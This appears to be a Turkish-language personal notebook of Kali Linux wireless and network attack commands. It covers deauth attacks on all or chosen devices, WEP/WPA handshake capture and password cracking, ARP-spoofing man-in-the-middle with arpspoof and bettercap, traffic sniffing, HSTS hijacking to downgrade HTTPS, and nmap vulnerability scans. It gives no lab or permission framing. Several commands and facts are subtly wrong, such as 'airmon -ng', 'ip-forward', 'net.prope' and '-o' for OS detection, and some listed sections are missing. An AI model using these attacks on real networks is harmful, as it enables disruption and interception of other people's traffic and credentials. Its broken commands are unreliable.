# Cyber Security
- [1-VPN DNS MAC](#1-VPN-DNS-MAC)
  - [VPN Book](#VPN-Book)
  - [Kali DNS Ayarları Değiştirme](#Kali-DNS-Ayarları-Değiştirme)
  - [DNS Sızıntı Testi](#DNS-Sızıntı-Testi)
  - [MAC Adresi Değiştirme](#MAC-Adresi-Değiştirme)
- [2-Monitör Mod ve Manage Mod](#2-Monitör-Mod-ve-Manage-Mod)
- [3-Çevredeki Modemleri Bulma](#3-Çevredeki-Modemleri-Bulma)
- [4-Deauth Saldırısı Yapma](#4-Deauth-Saldırısı-Yapma)
  - [Ağdaki Cihazların MAC Adreslerini Görme](#Ağdaki-Cihazların-MAC-Adreslerini-Görme)
  - [Ağdaki Cihazlara Deauth Saldırısı Yapma](#Ağdaki-Cihazlara-Deauth-Saldırısı-Yapma)
    - [Ağdaki Bütün Cihazlara Saldırı](#Ağdaki-Bütün-Cihazlara-Saldırı)
    - [Ağdaki Belirli Cihaza Saldırı](#Ağdaki-Belirli-Cihaza-Saldırı)
- [5-Wifi Parola Kırma](#5-Wifi-Parola-Kırma)
  - [WEB Parola Kırma](#WEB-Parola-Kırma)
  - [VPA ve VPA2 Parola Kırma](#VPA-ve-VPA2-Parola-Kırma)
    - [Handshake Yakalama](#Handshake-Yakalama)
    - [Wordlist Oluşturma](#Wordlist-Oluşturma)
    - [Parola Kırma](#Parola-Kırma)
    - [Brute Force Nedir](#Brute-Force-Nedir)
- [6-IP ve MAC Adreslerini Eşleme](#IP-ve-MAC-Adreslerini-Eşleme)
  - [Netdiscover](#Netdiscover)
  - [nmap](#nmap)
- [7-Man in the Middle Saldırısı](#7-Man-in-the-Middle-Saldırısı)
  - [Arpspoof](#Arpspoof)
  - [Wireshark ile MITM Saldırısı İzleme](#Wireshark-ile-MITM-Saldırısı-İzleme)
  - [Bettercap](#Bettercap)
    - [Bettercap ile Dinleme Yapma](#Bettercap-ile-Dinleme-Yapma)
  - [HTST](#HTST)
  - [HTTPS to HTTP](#HTTPS-to-HTTP)
  - [Windows Bilgisayarımıza MITM Saldırısı Var Mı](#Windows-Bilgisayarımıza-MITM-Saldırısı-Var-Mı)
- [8-NMAP](#NMAP)
  - [NMAP ile Açık Arama](#NMAP-ile-Açık-Arama)
    - [NMAP Komutları](#NMAP-Komutları)
  - [FTP](#FTP)
  - [TELNET ve SSH](#TELNET-ve-SSH)
  - [SAMBA](#SAMBA)
  - [POSTGRESQL METERPRETER](#POSTGRESQL METERPRETER]

# 1-VPN DNS MAC 

VPN (Virtual Personal Network)

DNS (Domain Name Server)

```iwconfig``` -> bağlı olduğumuz wifi ile ilgili bilgileri detaylı olarak gösterir

### VPN Book

```wwww.vpnbook.com``` kali içine VPN indirmemizi sağlar

```openvpn vpnadı``` -> vpn dosyasını açar

```service network-manager restart``` -> internet sunucularını resetler

### Kali DNS Ayarları Değiştirme

```nano /etc/dhcp/dhclient.conf``` içindeki ```prepentt name servers ```değiştirmemiz gerekir

Google DNS-> 8.8.8.8 ya da 8.4.4.8
Cloudflare -> 1.1.1.1. ya da 1.0.0.1

### DNS Sızıntı Testi 

www..dnsleaktest.com

### MAC Adresi Değiştirme

> ### 1.Yöntem

```macchanger```ile mac adresimizi değiştirebiliriz ya da

> ### 2.Yöntem
```
ifconfig wlan0 down

ifconfig wlan hw ether XX:XX:XX:XX:XX:XX  İstediğimiz MAC adresini yapmamızı sağlar

ifconfig wlan0 up
```

# 2-Monitör Mod ve Manage Mod

Wifi adaptörümüzü bilgisayarımıza bağlıyoruz, daha sonra kalimizi monitör moda almamız gerekiyor

> ### 1.Yöntem

```airmon -ng start wlan0```-> interneti monitör moda alır !! Monitör modda iken internete bağlanamayız sadece bağlı olmadığımız ağların bilgilerini elde edebiliriz

```airmon -ng stop wlan0``` -> interneti manage moda alır 

> ### 2.Yöntem
```
ifconfig wlan0 down

ifconfig wlan0 mode monitor

ifconfig wlan0 up
```

# 3-Çevredeki Modemleri Bulma

```airopdump -ng wlan0mon``` -> Çevredeki Modemleri Bulur

```CTRL + X ile işlemi sonlandırırız```

```
* pwr -> - Olarak ne kadar büyükse modem bize o kadar yakındır
* Data -> O ağa kaç cihazın bağlı olduğunu gösterir
* CH -> Hangi kanalda olduğunu gösterir
* ENC -> Şifreleme işlemi bilgisi
```

# 4-Deauth Saldırısı Yapma

### Ağdaki Cihazların MAC Adreslerini Görme
```
airodump -ng --channel X (kanal numarası) --bssid XX:XX:XX:XX:XX:XX (MAC adresi) --write airodumptest (Sonuçları yazdıracağımız 
dosya adı) wlan0
```
### Ağdaki Cihazlara Deauth Saldırısı Yapma

> ### Ağdaki Bütün Cihazlara Saldırı
```
aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX wlan0mon
```

> ### Ağdaki Belirli Cihaza Saldırı
```
aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon
```

```
* A: Gönderilecek paket sayısı, sayı büyüdükçe ağda düşme süresi artar
* -a:  Ağın MAC adresi
* -c:  Saldırı Yapılacak Cihazın MAC adresi
```

# 5-Wifi Parola Kırma 

### WEB Parola Kırma 

Fakeauth saldırısı yapıyoruz ağdan birisi düşüp tekrar bağlanırsa handshake yakalamamız kolaylaşır

```aireplay -ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h YY:YY:YY:YY:YY:YY wlan0mon```

```aireplay -ng --arpreplay -b XX:XX:XX:XX:XX:xX -h YY:YY:YY:YY:YY:YY wlan0mon``` belirlenen cihaza IV yollamamızı sağlar

Eğer Ağda Yeteri Kadar Cihaz Yoksa
* fakeauuth yolla
* arpreplay çalıştır
* aircrack -ng çalıştır

```aircrack -ng airodumptest.cap (Tarama Sırasında Yazdırdığımız Dosya)``` 

```192.168.1.1 modeminizin ara yüzüne giriş yaparsınız```

### VPA ve VPA2 Parola Kırma

www.gpuhash.me  -> içine yakalanan handshake'i atarak online olarak şifre kırma işlemi uygulanabilir

> ### Handshake Yakalama

``` airodump -ng --channel X --bssid XX:XX:XX:XX:XX:XX --write handshake-file wlan0mon```

```
channel: Ağın çalıştığı kanal
bssid: Ağın MAC adresi
write: Yakalanan handshake'in nereye kayıt edileceği
```

**! Kolayca handshake yakalamak için ufak paketli deauth saldırı yapılabilir**

> ### Wordlist Oluşturma

``` crunch 6 10 0123456789abcdefgh -o passwrd.txt``` 
içinde "0123456789abcdefgh" geçen min 6 maks 10 haneli şifre kombinasyonlarının olduğu passwrd isimli wordlist oluşturur

```filesystem/usr/shake/wordlist``` içinde en çok kullanılan şifrelerin bulunduğu wordlist

```cat wordlist.txt``` wordlistin içindeki şifreleri görmemizi sağlar

> ### Parola Kırma

``` aircrack -ng handshake-file.cap -w passwrd.txt``` handshake dosyasını ve worlisti kullanarak brute froce saldırısı yapar

> ### Brute Force Nedir

Brute Force mümkün olan bütün şifre kombinasyonlarını denemektir. Bu yöntemi kullanarak şifreyi kesin buluruz fakat bu işlem saatlerce, günlerce, aylarca, hatta yılllarca sürebilir

![image](https://user-images.githubusercontent.com/85068070/216357440-ba01b31d-76d1-4f35-b7ba-47da04ead32f.png)

# 6-IP ve MAC Adreslerini Eşleme

> ### Netdiscover

```netdiscover -i eth0 -r XX:XX:XX/24 -c 10``` 

* -r: eth0'daki inet'in ilk 6 hanesi
* -c: deneme sayısı

> ### nmap

``` nmap XX:XX.XX.0/24 ```  0 ve 24 yani tüm aralıktaki IPlere istek atar, IP ve MAC adreslerini eşleştirip ekstra bilgi verir. Atılan istekleri
karşı taraf görebilir

# 7-Man in the Middle Saldırısı

> ### Arpspoof

İlk olarak **arpspoof**'u indirmemiz gerekiyor onun için; ```apt install dsniff```

```arpspoof -i eth0 -t XX:XX:XX:XX YY:YY:YY:YY```  target'a kendimizi modem olarak tanıtıyoruz
```
-t: Kurban IP

YY:YY:YY:YY : Kendi IP adresimiz 
```
Daha sonra ```arpspoof -i eth0 -t YY:YY:YY:YY XX:XX:XX:XX``` yazarak modem'e kendimizi target olarak tanıtıyoruz
```
-t: Kendi IP'miz
XX:XX:XX:XX : Kurban IP
```
``` echo 1 > /proc/sys/net/ipv4/ip-forward``` IP forwardlamayı etkinleştirerek **hedef pc'nin** ağdan kopmamasını sağlıyoruz

> ### Wireshark ile MITM Saldırısı İzleme

Wireshark kullanarak ağ izleme yapılabilir ve ARP isteği var mı incelenebilir eğer işlemlerin yanında **duplicate use of..** yazıyorsa MITM saldırısı vardır. **http** olan websitesi içine girilen bilgiler (e.g. Login bilgileri) Wireshark içinden incelenerek görülebilir. **https** olan websitelerinde bu bilgiler şifreli olarak taşındığı için açık şekilde okunamaz

  ![wireshark görsel](https://github.com/ahmetnuysal/Cyber-Security/blob/6880076de41a97a03edb4fe36e75dfce1e58ac9a/MITM/WhatsApp%20Image%202022-08-16%20at%2019.17.24.jpeg)

> ### Bettercap 

* Terminal'e ```bettercap -iface eth0``` yazarak bettercap'i açıyoruz
* bettercap çalıştırdıktan sonra ```help``` yazarsak içinde nelerin çalıştığını görebiliriz
```
* ```net.prope on``` Ağdaki cihazların IP adresini, MAC adreslerini ve cihaz isimlerini gösterir
* ```net.show``` Toplanan bilgileri özet olarak gösterir
```
```
Bettercap İçinde
* ```arp.ban on``` hedef PC'ye deauth saldırısı yapar
* ```arp.spoof.fullduplex``` Hem modeme hem PC'ye MITM saldırısı yapar
* ```arp.spoof.internal``` True olursa, PC'ler arasındaki bağlantıları gösterir
* ```arp.spoof.skip_restore``` True olursa, Saldırı sonrası doğru verileri göndermez
* ```arp.spoof.targets 192.168.123.123``` "," koyarak birden fazla PC'ye MITM saldırısı yapabiliriz
* ```arp.spoof.whitelist``` Belirtilen IP adreslerine sahip cihazlara saldırı yapmaz
```
Parametreleri değiştirmek için: ```set``` komutunu kullanıyoruz. ```(e.g. arp.spoof.fullduplex true)``` 

> ### Bettercap ile Dinleme Yapma

* ```net.sniff on``` Hedef PC'yi dinlemeye başlar

> ### HTST

```htst``` ne olursa olsun o siteyi https olarak açmaya zorluyor

> ### HTTPS to HTTP

```hstshijack.cap``` dosyasında ```com``` uzantıları ```corn``` olarak değiştiriyoruz

> ### Windows Bilgisayarımıza MITM Saldırısı Var Mı 

Windows arama yerine ```cmd``` yazarak terminali açıyoruz ve ```arp -a``` yazarak modem ile aynı MAC adresine sahip birisi var mı görüyoruz

# 8- NMAP

> ### NMAP ile Açık Arama

# NMAP ile Açık İnceleme

```nmap -v -sS -A -T4 XX:XX:XX:XX:XX (Target IP)```  Taranan adresteki açıkları gösterir

> ### NMAP Komutları
```
-A: Farklı işletim sistemi versiyon vs verir.
-sn: Port taraması yapma anlamına gelir.
-n: DNS Çözümlemesi yapma anlamına gelir.
-v, -vv, -vvv: Ekrana gösterilecek detayları arttırır.
-F: Daha hızlı tarama yapar. Daha az sonuç bulur.
-sS:Syn Taraması Yapar
--reason: Bulduğu bir sonucun sebebini gösterir.
--open: Sadece açık Portları gösterir.
-p-: Bir IP üzerinde bulunması muhteme 65535 portun hepsini tarar.
-sV: Açık portta çalışan servisin ne olduğunu bulmaya çalışır.
-sC ile birlikte kullanılırsa işe yarar.
-sC: -sV ile versiyon tespiti yapılırken nmap scriptlerini kullanır.
-p: Sadece bu parametreden sonra belirtilen portları tarar.
-o: İşletim sistemi bilgilerini gösterir.
```
